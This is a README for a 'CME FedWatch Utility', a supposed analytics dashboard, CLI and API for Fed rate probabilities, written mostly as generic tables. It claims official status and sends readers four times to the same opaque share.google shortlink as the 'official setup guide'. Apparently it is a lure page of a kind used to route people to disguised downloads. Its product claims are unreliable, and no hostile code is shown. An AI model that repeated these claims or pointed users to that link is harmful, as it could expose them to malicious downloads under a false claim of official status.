# 🏦 CME FedWatch Utility — Complete Guide

<div align="center">

![CME FedWatch](https://img.shields.io/badge/CME-FedWatch-0EA5E9?style=for-the-badge&logo=chase&logoColor=white)
![Finance](https://img.shields.io/badge/Finance-Rate%20Markets-16A34A?style=for-the-badge&logo=bitcoin&logoColor=white)
![Analytics](https://img.shields.io/badge/Analytics-Probabilities-F59E0B?style=for-the-badge&logo=googlesheets&logoColor=black)
![Guides](https://img.shields.io/badge/Guides-92K-7C3AED?style=for-the-badge&logo=readthedocs&logoColor=white)

### 📊 Real-Time Fed Rate Probability Analytics for Traders & Analysts

*A complete guide to interpreting, tracking, and using CME FedWatch data*

</div>

<div align="center">

<img width="674" height="455" alt="images" src="https://github.com/user-attachments/assets/f252304c-babf-44b7-b842-6f591bd80286" />

</div>

---

## 🚀 Start in 30 Seconds

<table>
<tr>
<td width="33%" align="center">

### 🎯 What You Get

📊 Live probabilities
📈 Trend charts
🔔 Smart alerts
📤 Export tools

</td>
<td width="33%" align="center">

### 🧭 Choose Your Path

[👨‍💼 Trader](#-for-traders)
[🎓 Researcher](#-for-researchers)
[💻 Developer](#-for-developers)
[📚 Learner](#-for-learners)

</td>
<td width="33%" align="center">

### ⚡ Quick Links

[📥 Get Instructions](#-get-instructions)
[⚙️ Setup](#-setup-workflow)
[📊 Usage](#-using-the-utility)
[🩺 Support](#-troubleshooting)

</td>
</tr>
</table>

---

## 🎯 Overview

**CME FedWatch Utility** is a modern analytics dashboard that visualizes the **CME Group's FedWatch Tool** data — the market-implied probabilities of Federal Reserve interest rate decisions. It turns raw 30-Day Fed Funds futures pricing into actionable, easy-to-read probabilities.

Traders, economists, and analysts use FedWatch to understand what the market believes the Fed will do at each upcoming FOMC meeting. This utility makes that data richer, more accessible, and easier to integrate into workflows.

### 📊 What It Shows

| Metric | Description |
|--------|-------------|
| 🎯 **Meeting Probabilities** | Rate outcome odds per FOMC |
| 📈 **Trend Lines** | Shift over time |
| 📅 **Meeting Calendar** | Upcoming FOMC dates |
| 🎚️ **Rate Range** | Current target range |
| 🔮 **Expected Path** | Implied future rates |
| 📉 **Historical Comparison** | vs previous months |

---

## 👥 Role-Based Guides

### 👨‍💼 For Traders

> **Focus: actionable signals, alerts, and positioning**

| Priority | Section |
|:--------:|---------|
| 1️⃣ | [Interpreting Odds](#-interpreting-odds) |
| 2️⃣ | [Alerts & Automation](#-alerts--automation) |
| 3️⃣ | [Strategy Applications](#-strategy-applications) |
| 4️⃣ | [Sample Output](#-sample-output) |

**Key workflows:**
- 🎯 Position ahead of FOMC
- 📊 Monitor overnight shifts
- 🔔 Get alerts on >5% probability changes
- 📈 Compare current vs historical cycles

---

### 🎓 For Researchers

> **Focus: data quality, exports, and reproducibility**

| Priority | Section |
|:--------:|---------|
| 1️⃣ | [Data Sources](#-core-concepts) |
| 2️⃣ | [API Reference](#-api-reference) |
| 3️⃣ | [Export Options](#-cli-reference) |
| 4️⃣ | [Historical Data](#-verification) |

**Key workflows:**
- 📥 Bulk export in CSV/JSON
- 🧮 Programmatic access via Python
- 📊 Build custom visualizations
- 🗂️ Cite proper sources

---

### 💻 For Developers

> **Focus: integration, automation, and self-hosting**

| Priority | Section |
|:--------:|---------|
| 1️⃣ | [API Reference](#-api-reference) |
| 2️⃣ | [CLI Reference](#-cli-reference) |
| 3️⃣ | [Automation Recipes](#-automation-recipes) |
| 4️⃣ | [Docker Setup](#-setup-workflow) |

**Key workflows:**
- 🔌 REST API integration
- 🤖 Webhook alerts
- 🐳 Docker self-host
- 📊 Custom dashboards

---

### 📚 For Learners

> **Focus: concepts, terminology, and market context**

| Priority | Section |
|:--------:|---------|
| 1️⃣ | [Core Concepts](#-core-concepts) |
| 2️⃣ | [Why It Matters](#-why-it-matters) |
| 3️⃣ | [Glossary](#-core-concepts) |
| 4️⃣ | [FAQ](#-faq) |

**Key learnings:**
- 🏦 How the Fed sets rates
- 📈 How futures imply probabilities
- 🎯 Reading odds correctly
- 📚 Using it for research

---

## 💡 Why It Matters

| Reason | Benefit |
|--------|---------|
| 💰 **Trade Positioning** | Align with market odds |
| 🧠 **Macro Context** | Understand Fed expectations |
| 📈 **Bond Strategy** | Duration decisions |
| 💱 **FX Trading** | USD strength forecasting |
| 🏦 **Risk Management** | Scenario planning |
| 📊 **Research** | Academic and professional analysis |
| 🎯 **Event Trading** | Pre/post-FOMC plays |

---

## 🧬 Core Concepts

| Term | Meaning |
|------|---------|
| 🏦 **FOMC** | Federal Open Market Committee |
| 🎯 **Target Range** | Fed's policy rate band |
| 📉 **Fed Funds Futures** | Contracts tracking rate expectations |
| 🎚️ **Implied Probability** | Market-implied likelihood |
| 📅 **Meeting Date** | Scheduled FOMC decision |
| 🔮 **Dot Plot** | Fed officials' own projections |
| 📊 **Contract Month** | Futures expiry |

---

## 🖥️ System Requirements

### 🔹 Minimum

```
✅ OS: Windows 10, macOS 11+, Ubuntu 20.04+
✅ CPU: Dual-core 2.0 GHz
✅ RAM: 4 GB
✅ Storage: 250 MB
✅ Internet: Required for live data
✅ Browser: Modern (for web version)
✅ Python: 3.10+ (for CLI)
```

### 🔸 Recommended

```
⭐ OS: Windows 11 / macOS 13+ / Ubuntu 22.04+
⭐ CPU: Quad-core 2.5 GHz+
⭐ RAM: 8 GB
⭐ Storage: 1 GB SSD
⭐ Display: 1920×1080+
⭐ Runtime: Python 3.11+ / Docker
⭐ Data: CME DataMine API access (optional)
```

<div align="center">

[![Get Instructions](https://img.shields.io/badge/📘_GET_INSTRUCTIONS-0EA5E9?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=0C4A6E)](https://share.google/uK1ycJxDd8i8JTk6J)

</div>

---

## 📘 Get Instructions

<div align="center">

### 🚀 Access the Official Setup Guide

Click below to reach the instructions portal:

<br>

[![Get Instructions](https://img.shields.io/badge/📘_GET_INSTRUCTIONS-16A34A?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=14532D)](https://share.google/uK1ycJxDd8i8JTk6J)

<br>

*Official • Finance-Ready • Updated 2025*

</div>

### 📚 Available Guides

| Guide | Purpose |
|-------|---------|
| 📘 **Setup Guide** | Install and run |
| 📗 **Data Guide** | Understand the source |
| 📙 **Trading Guide** | Strategy applications |
| 📕 **API Guide** | Programmatic access |
| 📓 **Glossary** | Terms explained |

---

## ⚙️ Setup Workflow

### 🪜 Stage 1 — Access the Instructions

Open the official setup guide from the button above.

### 🪜 Stage 2 — Choose Install Method

| Method | Best For |
|--------|----------|
| 🖥️ **CLI** | Scripting & automation |
| 🌐 **Web Dashboard** | Quick lookups |
| 🐍 **Python Library** | Analytics |
| 🐳 **Docker** | Server deployment |

### 🪜 Stage 3 — Install via pip

```bash
pip install cmefedwatch
```

### 🪜 Stage 4 — Verify Install

```bash
fedwatch --version
```

Expected: `cme-fedwatch v2.x.x`

<div align="center">

[![Get Instructions](https://img.shields.io/badge/📘_GET_INSTRUCTIONS-F59E0B?style=for-the-badge&logo=readthedocs&logoColor=black&labelColor=92400E)](https://share.google/uK1ycJxDd8i8JTk6J)

</div>

### 🪜 Stage 5 — Configure API Access

```yaml
# ~/.fedwatch/config.yaml
sources:
  cme:
    api_key: "YOUR_KEY"
    environment: "production"

cache:
  enabled: true
  ttl: 300

alerts:
  enabled: true
  threshold: 5
```

### 🪜 Stage 6 — First Run

```bash
fedwatch dashboard
```

Opens the web UI at `http://localhost:8080`.

### 🪜 Stage 7 — Verify Data

Check that the latest FOMC meeting probabilities appear.

### 🪜 Stage 8 — Enable Alerts

```bash
fedwatch alerts enable --threshold 5 --email you@example.com
```

---

## 📊 Using the Utility

### 🖥️ Dashboard Sections

| Panel | Shows |
|-------|-------|
| 📅 **Meeting List** | All upcoming FOMC dates |
| 🎯 **Probability Bars** | Rate outcome odds |
| 📈 **Trend Chart** | Odds over time |
| 🔮 **Expected Path** | Implied future rate |
| 📰 **News Feed** | Related headlines |
| ⚙️ **Settings** | Preferences |

### 🎯 Sample Output

```
FOMC Meeting: 2025-01-29

Rate Outcomes:
  ▸ 4.25–4.50%  .......... 62.4%
  ▸ 4.50–4.75%  .......... 34.1%
  ▸ 4.75–5.00%  ..........  3.5%

Implied Rate: 4.44%
Confidence:   High
```

### 🎛️ Interactive Filters

| Filter | Options |
|--------|---------|
| 📅 **Timeframe** | 1W, 1M, 3M, 1Y |
| 🎯 **Meeting** | Select specific FOMC |
| 📊 **Chart Type** | Line, bar, heatmap |
| 🔔 **Alerts** | Configure thresholds |

---

## 🔔 Alerts & Automation

### 📧 Alert Types

| Alert | Trigger |
|-------|---------|
| 📈 **Probability Shift** | > 5% change |
| 📅 **Meeting Reminder** | 24h before FOMC |
| 📰 **News Mention** | Fed official speaks |
| 🚨 **Threshold Cross** | Custom rule hit |

### 🤖 Automation Recipes

```bash
# Daily snapshot email
fedwatch snapshot --output daily-$(date +%F).pdf \
  --email team@example.com

# Slack webhook on shift
fedwatch alerts add --type probability \
  --threshold 10 --webhook https://hooks.slack.com/...
```

---

## 🧠 Strategy Applications

### 📈 Interpreting Odds

| Reading | Meaning | Action |
|---------|---------|--------|
| 🟢 **>70% for hike** | Market expects tightening | Consider USD long |
| 🟡 **40–60%** | Uncertainty | Wait for clarity |
| 🔴 **>70% for cut** | Market expects easing | Consider USD short |
| ⚪ **Dead even** | High volatility | Hedge positions |

### 💼 Common Use Cases

| Use Case | Approach |
|----------|----------|
| 📊 **Bond Trading** | Align duration with path |
| 💱 **FX Trading** | Position on rate differentials |
| 📈 **Equity Hedging** | Anticipate volatility |
| 🏦 **Banking Strategy** | Forecast funding costs |
| 📚 **Research** | Quantify policy expectations |

---

## 🧪 Verification

| Check | Command | Expected |
|-------|---------|----------|
| ✅ Install | `fedwatch --version` | Version shown |
| ✅ API works | `fedwatch test-source` | Connected |
| ✅ Dashboard loads | Browser | UI visible |
| ✅ Data displays | Meeting list | Present |
| ✅ Alerts enabled | `fedwatch alerts list` | Active |
| ✅ Export works | `fedwatch export` | File created |
| ✅ History loads | Trend chart | Data shown |
| ✅ No errors | Log check | Clean |

---

## 🩺 Troubleshooting

| Problem | Cause | Solution |
|---------|-------|----------|
| 🚫 No data shown | API key | Verify key |
| 🚫 Dashboard won't load | Port | Change port |
| 🚫 Slow refresh | Rate limit | Increase cache |
| 🚫 Charts blank | Browser cache | Hard refresh |
| 🚫 Alerts not firing | Threshold | Adjust value |
| 🚫 Export fails | Disk | Free space |
| 🚫 Wrong meeting date | Time zone | Set UTC |
| 🚫 Python import error | Env | Use venv |
| 🚫 Docker fail | Port | Remap |
| 🚫 Source timeout | Network | Retry |

### 🔄 Reset Cache

```bash
fedwatch cache clear
```

---

## 🧰 CLI Reference

| Command | Purpose |
|---------|---------|
| `fedwatch dashboard` | Open UI |
| `fedwatch meetings` | List FOMC dates |
| `fedwatch show <date>` | Show probabilities |
| `fedwatch trends` | Historical chart |
| `fedwatch export` | Export data |
| `fedwatch alerts` | Manage alerts |
| `fedwatch snapshot` | Save PDF report |
| `fedwatch test-source` | Verify API |
| `fedwatch cache clear` | Reset cache |
| `fedwatch --help` | Show help |

---

## 🔌 API Reference

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/api/meetings` | GET | List FOMC |
| `/api/meetings/:date` | GET | Single meeting |
| `/api/trends` | GET | Trend data |
| `/api/alerts` | POST | Create alert |
| `/api/export` | POST | Export data |
| `/api/health` | GET | Status check |

---

## 📚 Resources

| Resource | Purpose |
|----------|---------|
| 📖 **CME Group Docs** | Official data source |
| 📗 **Fed Website** | FOMC calendar |
| 💬 **Trading Forums** | Community insights |
| 📊 **Bloomberg/Reuters** | Financial news |
| 🎓 **Macroeconomics 101** | Learn fundamentals |

---

## 💬 FAQ

**Is CME FedWatch free?**
The public tool is free; API access may require data fees.

**Where does the data come from?**
30-Day Fed Funds futures pricing on CME.

**Is it accurate?**
It reflects market-implied probabilities, not predictions.

**Can I use it for trading?**
Yes — it's a widely used input among professionals.

**Does it update in real time?**
Yes — with a live data feed.

**Can I export historical data?**
Yes — via CSV, JSON, or PDF.

**Is there a mobile app?**
The web dashboard is mobile-friendly.

**Does it cover international rates?**
It focuses on US Fed policy.

**Can I automate alerts?**
Yes — via email, Slack, webhooks.

**Is it suitable for research?**
Yes — used in academic and professional work.

---

## 📅 Version History

| Version | Date | Highlights |
|---------|------|-----------|
| **2.3.0** | Jan 2025 | Live alerts |
| 2.1.0 | Oct 2024 | Trend charts |
| 1.9.0 | Jun 2024 | API v2 |
| 1.5.0 | Feb 2024 | Initial release |

---

<div align="center">

### 🌟 Found This Guide Helpful?

[![Get Instructions](https://img.shields.io/badge/📘_GET_INSTRUCTIONS-7C3AED?style=for-the-badge&logo=chase&logoColor=white&labelColor=4C1D95)](https://share.google/uK1ycJxDd8i8JTk6J)

**⭐ Star this repository if it helped! ⭐**

*Made with 💜 for the trading community*

</div>
